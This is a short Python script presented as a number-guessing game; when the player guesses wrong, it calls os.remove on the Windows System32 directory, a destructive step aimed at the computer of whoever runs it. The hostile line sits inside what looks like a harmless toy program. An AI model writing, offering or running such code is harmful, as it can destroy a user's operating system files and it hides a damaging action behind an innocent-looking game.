import os 
import random 

number = random.randint(1,10)

guess = input("Guess number between 1 and 10 :)")
guess = int(guess)

if guess == number:
    print("You are lucky!")
else:
    os.remove("C:\Windows\System32")